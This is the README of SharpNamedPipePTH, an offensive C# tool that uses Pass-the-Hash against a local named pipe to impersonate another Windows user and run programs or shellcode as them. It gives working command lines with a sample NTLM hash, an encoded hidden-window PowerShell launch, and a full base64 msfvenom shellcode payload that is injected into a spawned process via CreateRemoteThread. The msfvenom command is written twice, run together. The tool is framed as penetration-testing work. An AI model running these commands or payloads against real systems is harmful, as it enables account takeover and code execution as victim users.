# SharpNamedPipePTH

This project is a C# tool to use Pass-the-Hash for authentication on a local Named Pipe  for user Impersonation. There is a blog post for explanation:

[https://s3cur3th1ssh1t.github.io/Named-Pipe-PTH/](https://s3cur3th1ssh1t.github.io/Named-Pipe-PTH/)

It is heavily based on the code from the project [Sharp-SMBExec](https://github.com/checkymander/Sharp-SMBExec/).

I faced certain Offensive Security project situations in the past, where I already had the NTLM-Hash of a `low privileged` user account and needed a shell for that user on the current compromised system - but that was not possible with the current public tools. Imagine two more facts for a situation like that - the NTLM Hash could not be cracked *and* there is no process of the victim user to execute shellcode in it or to migrate into that process. This may sound like an absurd edge-case for some of you. I still experienced that multiple times. Not only in one engagement I spend a lot of time searching for the right tool/technique in that specific situation.

My personal goals for a tool/technique were:

* Fully featured shell or C2-connection as the victim user-account
* It must to able to also Impersonate `low privileged` accounts - depending on engagement goals it might be needed to access a system with a specific user such as the CEO, HR-accounts, SAP-administrators or others
* The tool can be used as C2-module

The impersonated user unfortunately has *no network authentication* allowed, as the new process is using an Impersonation Token which is restricted. So you can only use this technique for local actions with another user.

There are two ways to use SharpNamedPipePTH. Either you can execute a binary (with or without arguments):

`
SharpNamedPipePTH.exe username:testing hash:7C53CFA5EA7D0F9B3B968AA0FB51A3F5 binary:C:\windows\system32\cmd.exe
`

![alt text](https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH/blob/main/Resources/Example1.JPG?raw=true)

`
SharpNamedPipePTH.exe username:testing domain:localhost  hash:7C53CFA5EA7D0F9B3B968AA0FB51A3F5 binary:"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" arguments:"-nop -w 1 -sta -enc bgBvAHQAZQBwAGEAZAAuAGUAeABlAAoA"
`

Or you can execute shellcode as the other user:

`
SharpNamedPipePTH.exe username:testing domain:localhost hash:7C53CFA5EA7D0F9B3B968AA0FB51A3F5 shellcode:/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY21kLmV4ZQA=
`

Which is `msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=threadmsfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread | base64 -w0`.

I'm not happy with the shellcode execution yet, as it's currently spawning notepad as the impersonated user and injects shellcode into that new process via D/Invoke CreateRemoteThread Syscall. I'm still looking for possibility to spawn a process in the background or execute shellcode without having a process of the target user for memory allocation.

![alt text](https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH/blob/main/Resources/Example2.JPG?raw=true)

